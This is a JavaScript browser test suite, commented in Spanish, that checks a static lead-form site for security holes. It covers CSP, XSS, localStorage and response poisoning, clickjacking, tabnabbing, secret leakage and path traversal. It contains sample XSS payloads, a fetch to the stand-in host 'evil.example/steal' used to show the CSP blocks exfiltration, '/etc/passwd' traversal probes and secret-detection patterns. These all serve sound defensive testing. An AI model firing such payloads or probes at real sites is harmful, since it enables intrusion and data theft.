// Pentest del sitio en el navegador: CSP, XSS reflejado/DOM/almacenado, envenenamiento
// de localStorage y de respuestas, tabnabbing, clickjacking, privacidad y fugas.
import test, { before, after } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs'; import path from 'node:path';
import { startServer } from '../helpers/server.mjs';
import { launch, open, fillLead, API } from '../helpers/browser.mjs';
import { SITE } from '../helpers/browser-data.mjs';

let server, browser;
before(async () => { server = await startServer(); browser = await launch(); });
after(async () => { await browser.close(); server.srv.close(); });

const PAYLOADS = ['<img src=x onerror="window.__pwned=1">', '"><svg onload=window.__pwned=1>', "javascript:window.__pwned=1", '</textarea><script>window.__pwned=1</script>', '{{constructor.constructor("window.__pwned=1")()}}', '\u202Egnp.exe', '${window.__pwned=1}'];
const pwned = (p) => p.evaluate(() => window.__pwned === 1 || !!document.querySelector('img[src="x"], svg[onload], script:not([src]):not([type="application/ld+json"])'));

test('C01 CSP estricta presente en todas las páginas', async () => {
  for (const f of ['index.html', '404.html']) {
    const html = fs.readFileSync(path.join(SITE, f), 'utf8');
    const csp = html.match(/http-equiv="Content-Security-Policy" content="([^"]+)"/)[1];
    assert.match(csp, /default-src 'none'/, f);
    assert.match(csp, /base-uri 'none'/, f);
    assert.match(csp, /form-action 'none'/, f);
    assert.doesNotMatch(csp, /unsafe-inline|unsafe-eval|\*|data: .*script|http:/, f);
  }
});

test('C02 sin scripts, estilos ni manejadores en línea en el HTML', () => {
  for (const f of ['index.html', '404.html']) {
    const html = fs.readFileSync(path.join(SITE, f), 'utf8');
    const inline = [...html.matchAll(/<script(?![^>]*\bsrc=)([^>]*)>/g)].filter(m => !/application\/ld\+json/.test(m[1]));
    assert.equal(inline.length, 0, f + ' script en línea');
    assert.doesNotMatch(html, /\son[a-z]+\s*=/i, f + ' manejador on*');
    assert.doesNotMatch(html, /\sstyle\s*=/i, f + ' atributo style');
    assert.doesNotMatch(html, /<style/i, f + ' bloque style');
    assert.doesNotMatch(html, /href\s*=\s*"javascript:/i, f);
  }
});

test('C03 la CSP bloquea de verdad: script inyectado, eval y estilo en línea', async () => {
  const p = await open(browser, server.url);
  const res = await p.evaluate(async () => {
    const v = []; document.addEventListener('securitypolicyviolation', e => v.push(e.violatedDirective));
    const s = document.createElement('script'); s.textContent = 'window.__pwned=1'; document.body.appendChild(s);
    const d = document.createElement('div'); d.setAttribute('style', 'color:red'); document.body.appendChild(d);
    const img = new Image(); img.src = 'https://evil.example/x.png';
    try { await fetch('https://evil.example/steal'); } catch (e) {}
    await new Promise(r => setTimeout(r, 300));
    return { pwned: window.__pwned === 1, v, color: getComputedStyle(d).color };
  });
  assert.equal(res.pwned, false); // eval: la CSP no incluye 'unsafe-eval' (C01); Playwright evalúa por CDP y no sirve para probarlo
  assert.notEqual(res.color, 'rgb(255, 0, 0)');
  for (const d of ['script-src-elem', 'style-src-attr', 'img-src', 'connect-src']) assert.ok(res.v.some(x => x.startsWith(d.split('-')[0])), d + ' ' + res.v);
  await p.context().close();
});

test('C04 XSS reflejado por la URL (?lang, hash, parámetros extra)', async () => {
  for (const q of ['/?lang=<img src=x onerror=window.__pwned=1>', '/?lang=pt"><svg onload=window.__pwned=1>', '/#<img src=x onerror=window.__pwned=1>', '/?lang=__proto__', '/?lang=constructor&x=<script>window.__pwned=1</script>']) {
    const p = await open(browser, server.url, { path: q });
    assert.equal(await pwned(p), false, q);
    assert.ok(['es', 'pt', 'en'].includes(await p.getAttribute('html', 'lang')), q);
    assert.deepEqual(p.errors.filter(e => !/Content Security Policy/.test(e)), [], q);
    await p.context().close();
  }
});

test('C05 XSS almacenado en el borrador: localStorage envenenado', async () => {
  const poison = [
    JSON.stringify({ service: 'infra', desc: PAYLOADS[0], urgency: PAYLOADS[1], channel: '<x>', details: { situacion: PAYLOADS[2], uso: [PAYLOADS[0], 'web'] }, step: 9, savedAt: Date.now() }),
    JSON.stringify({ service: '__proto__', savedAt: Date.now(), details: { __proto__: { polluted: 1 } } }),
    '{"service":', 'x'.repeat(30000), '[]', 'null', JSON.stringify({ service: 'dev', desc: 'viejo', savedAt: Date.now() - 30 * 86400e3 })
  ];
  for (const val of poison) {
    const p = await open(browser, server.url, { init: `try{localStorage.setItem('rdm-draft-v1', ${JSON.stringify(val)});localStorage.setItem('rdm-lang','<img src=x onerror=window.__pwned=1>');localStorage.setItem('rdm-theme','"><script>')}catch(e){}` });
    assert.equal(await pwned(p), false);
    assert.equal(await p.evaluate(() => ({}).polluted), undefined);
    assert.deepEqual(p.errors, [], val.slice(0, 40));
    assert.equal(await p.getAttribute('html', 'data-theme'), null, 'tema inválido ignorado');
    const step = await p.evaluate(() => [1, 2, 3, 4, 5].find(n => !document.getElementById('step' + n).hidden));
    assert.ok(step >= 1 && step <= 3, 'nunca salta a datos personales ni revisión');
    await p.context().close();
  }
});

test('C06 XSS por los campos del formulario: la revisión muestra texto, no HTML', async () => {
  const p = await open(browser, server.url);
  await fillLead(p, { desc: PAYLOADS.join(' '), name: PAYLOADS[0] + ' Ana', company: PAYLOADS[1] });
  await p.click('#nextBtn');
  assert.ok(await p.isVisible('#step5'));
  assert.equal(await pwned(p), false);
  assert.match(await p.textContent('#review'), /<img src=x onerror/);
  await p.click('#sendBtn');
  assert.equal(await pwned(p), false);
  await p.context().close();
});

test('C07 respuestas hostiles del servidor (config y envío) no inyectan nada', async () => {
  const p = await open(browser, server.url, { api: true });
  await p.route(API + '**', r => r.request().method() === 'GET'
    ? r.fulfill({ status: 200, contentType: 'application/json', body: JSON.stringify({ available: '<img src=x onerror=window.__pwned=1>', t: '<script>', __proto__: { polluted: 1 } }) })
    : r.fulfill({ status: 200, contentType: 'application/json', body: JSON.stringify({ ok: true, id: 'RDM-2610-0001<img src=x onerror=window.__pwned=1>', error: '<b>x</b>' }) }));
  await p.reload();
  await fillLead(p); await p.click('#nextBtn'); await p.click('#sendBtn');
  await p.waitForSelector('#err-send:not(:empty)');
  assert.equal(await pwned(p), false);
  assert.equal(await p.evaluate(() => ({}).polluted), undefined);
  const sent = p.apiCalls.filter(c => c.method === 'POST');
  if (sent.length) assert.equal(JSON.parse(sent[0].body).t, '', 'token inválido no se reenvía');
  await p.context().close();
});

test('C08 inyección de selectores: valores manipulados no rompen querySelector', async () => {
  const p = await open(browser, server.url);
  await fillLead(p);
  await p.evaluate(() => { const r = document.querySelector('input[name="urgency"]:checked'); r.value = '"],*{x:1}[a="'; });
  await p.click('#nextBtn');
  assert.deepEqual(p.errors, []);
  await p.context().close();
});

test('C09 tabnabbing: todo enlace externo con target=_blank lleva noopener y noreferrer', async () => {
  const p = await open(browser, server.url);
  for (const id of ['utu', 'hardened', 'dmz']) { await p.click(`[data-project="${id}"]`); await p.keyboard.press('Escape'); }
  const bad = await p.$$eval('a[target="_blank"]', as => as.filter(a => !/noopener/.test(a.rel) || !/noreferrer/.test(a.rel)).map(a => a.href));
  assert.deepEqual(bad, []);
  const hrefs = await p.$$eval('a[href]', as => as.map(a => a.getAttribute('href')));
  assert.ok(hrefs.every(h => /^(#|https:\/\/|\.well-known\/|\/)/.test(h)), hrefs.filter(h => !/^(#|https:\/\/|\.well-known\/|\/)/.test(h)).join());
  await p.context().close();
});

test('C10 clickjacking: dentro de un marco ajeno en producción el formulario no envía', async () => {
  const p = await open(browser, server.url);
  // Se simula el host de producción para el documento enmarcado
  await p.route('https://gonzabot.github.io/**', async r => {
    const u = new URL(r.request().url()); const f = path.join(SITE, u.pathname === '/' ? 'index.html' : u.pathname);
    try { await r.fulfill({ body: fs.readFileSync(f), contentType: f.endsWith('.html') ? 'text/html' : f.endsWith('.css') ? 'text/css' : f.endsWith('.js') ? 'text/javascript' : 'application/octet-stream' }); } catch { await r.fulfill({ status: 404, body: '' }); }
  });
  await p.route('https://evil.example/**', r => r.fulfill({ contentType: 'text/html', body: '<iframe id="f" src="https://gonzabot.github.io/" width="1200" height="900"></iframe>' }));
  await p.goto('https://evil.example/');
  const frame = await (await p.waitForSelector('#f')).contentFrame();
  await frame.waitForSelector('#leadForm');
  assert.equal(await frame.evaluate(() => document.documentElement.classList.contains('is-framed')), true);
  assert.equal(await frame.evaluate(() => getComputedStyle(document.querySelector('#leadForm')).pointerEvents), 'none');
  await p.context().close();
});

test('C11 privacidad: el borrador no guarda nombre, correo, teléfono ni empresa', async () => {
  const p = await open(browser, server.url);
  await fillLead(p, { phone: '099 555 666', channel: 'whatsapp' });
  await p.waitForTimeout(500);
  const draft = await p.evaluate(() => localStorage.getItem('rdm-draft-v1'));
  assert.ok(draft);
  assert.doesNotMatch(draft, /María|maria@|099 555|Comercial del Norte/);
  assert.ok(JSON.parse(draft).savedAt > 0);
  const cookies = await p.context().cookies();
  assert.deepEqual(cookies, [], 'sin cookies');
  await p.context().close();
});

test('C12 fuga de información: sin secretos, rutas internas ni comentarios sensibles en lo publicado', () => {
  const files = [];
  const walk = (d) => fs.readdirSync(d, { withFileTypes: true }).forEach(e => { const f = path.join(d, e.name); e.isDirectory() ? walk(f) : files.push(f); });
  walk(SITE);
  const text = files.filter(f => /\.(html|js|css|txt|json|xml|webmanifest|svg)$/.test(f)).map(f => fs.readFileSync(f, 'utf8')).join('\n');
  assert.doesNotMatch(text, /AKfyc[a-zA-Z0-9_-]{20,}/, 'URL de despliegue real no versionada');
  assert.doesNotMatch(text, /\d{8,10}:[A-Za-z0-9_-]{30,}/, 'token de Telegram');
  assert.doesNotMatch(text, /(api[_-]?key|secret|password|passwd)\s*[:=]\s*["'][^"']{6,}/i);
  assert.doesNotMatch(text, /\/home\/|\/root\/|C:\\\\Users/);
  assert.doesNotMatch(text, /\bTODO\b|\bFIXME\b|\bHACK\b/);
  assert.ok(!files.some(f => /\.(env|pem|key|bak|swp|log|map)$|\.git\//.test(f)), 'archivos sensibles');
});

test('C13 análisis estático: sin sumideros peligrosos en el JavaScript propio', () => {
  for (const f of ['app.js', 'form.js', 'logic.js', 'theme-init.js', 'config.js', 'i18n.js', 'data.js']) {
    const js = fs.readFileSync(path.join(SITE, 'assets/js', f), 'utf8');
    assert.doesNotMatch(js, /\.innerHTML|\.outerHTML|insertAdjacentHTML|document\.write|\beval\(|new Function|setTimeout\(\s*["'`]|setInterval\(\s*["'`]|\.setAttribute\(\s*["']on|(window|document)\.location\s*=|location\.href\s*=|location\.assign|postMessage|window\.open\(/, f);
  }
});

test('C14 security.txt válido según RFC 9116', async () => {
  const txt = fs.readFileSync(path.join(SITE, '.well-known/security.txt'), 'utf8');
  assert.match(txt, /^Contact: https:\/\//m);
  const exp = new Date(txt.match(/^Expires: (.+)$/m)[1]);
  assert.ok(exp > new Date() && exp - new Date() < 366 * 86400e3, 'vence en menos de un año');
  assert.match(txt, /^Canonical: https:\/\/gonzabot\.github\.io\/\.well-known\/security\.txt$/m);
  assert.match(txt, /^Preferred-Languages: es, pt, en$/m);
});

test('C15 recorrido de directorios y archivos ocultos en el servidor de pruebas (paridad con Pages)', async () => {
  const p = await open(browser, server.url);
  for (const u of ['/../apps-script/Code.gs', '/%2e%2e/%2e%2e/etc/passwd', '/assets/../../tests/helpers/gas.mjs', '/.git/config']) {
    const r = await p.request.get(server.url + u);
    assert.ok([403, 404].includes(r.status()) || !(await r.text()).includes('function doPost'), u);
  }
  await p.context().close();
});
